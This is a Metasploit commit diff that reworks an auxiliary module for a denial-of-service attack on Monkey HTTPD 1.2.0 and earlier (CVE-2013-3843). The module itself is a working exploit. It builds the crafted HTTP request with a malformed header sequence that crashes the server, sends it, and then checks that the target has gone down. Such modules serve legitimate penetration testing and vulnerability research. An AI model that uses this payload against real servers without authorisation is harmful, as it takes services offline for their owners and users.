f1d67009db50cd0cb9a7c9f45ce0fe06f0b8104b
sinn3r <wei_chen@rapid7.com>
2013-06-13 15:52:21 -0500

    Land #1950 - Monkey HTTPD Header Parsing Denial-of-Service
    This is the reviewed/updated version of pull request #1950. We're
    landing this one instead because the other one has a lot of
    unnecessary commit messages.

--- modules/auxiliary/dos/http/monkey_headers.rb
+++ modules/auxiliary/dos/http/monkey_headers.rb
@@ -14,48 +14,62 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'           => 'Monkey HTTPD Headers',
+			'Name'           => 'Monkey HTTPD Header Parsing Denial-of-Service',
 			'Description'    => %q{
-					Improper header parsing leads to a segmentation fault when a
-				specially crafted request is sent to the server.
-				Affects version <= 1.2.0.
+				This module causes improper header parsing that leads to a segmentation fault
+				due to a specially crafted HTTP request. Affects version <= 1.2.0.
 			},
 			'Author'         =>
 				[
-					'Doug Prostko <dougtko[at]gmail[dot]com>'
+					'Doug Prostko <dougtko[at]gmail.com>'
 				],
 			'License'        => MSF_LICENSE,
 			'References'     =>
 				[
 					['CVE', '2013-3843'],
+					['URL', 'http://bugs.monkey-project.com/ticket/182']
 				],
 			'DisclosureDate' => 'May 30 2013'))
 
 		register_options(
 			[
-				Opt::RPORT(2001),
+				Opt::RPORT(2001)
 			], self.class)
 	end
 
-	# Sends the DoS request twice.  The first request kills the server,
-	# and the second verifies that it went down.
-	def run
+	def dos
 		req = "GET / HTTP/1.1\r\n"
 		req << "Host:\r\n\r\nlocalhost\r\n"
-		req << "User-Agent:#{Rex::Text.rand_text_alpha(3)}\r\n\r\n"
-		2.times do
-			begin
-				connect
-				print_status("Sending DoS packet to #{rhost}:#{rport}")
-				sock.put(req)
-				disconnect
-				Rex.sleep 1
-			rescue ::Rex::ConnectionRefused
-				print_good("Connection Refused: Success!")
-				break
-			ensure
-				disconnect
-			end
+		req << "User-Agent:\r\n\r\n"
+
+		connect
+		sock.put(req)
+		disconnect
+	end
+
+	def is_alive?
+		begin
+			connect
+		rescue Rex::ConnectionRefused
+			return false
+		ensure
+			disconnect
+		end
+
+		true
+	end
+
+	def run
+		print_status("#{rhost}:#{rport} - Sending DoS packet...")
+		dos
+
+		print_status("#{rhost}:#{rport} - Checking server status...")
+		Rex.sleep(1)
+
+		if is_alive?
+			print_error("#{rhost}:#{rport} - Server is still alive")
+		else
+			print_good("#{rhost}:#{rport} - Connection Refused: Success!")
 		end
 	end
 end
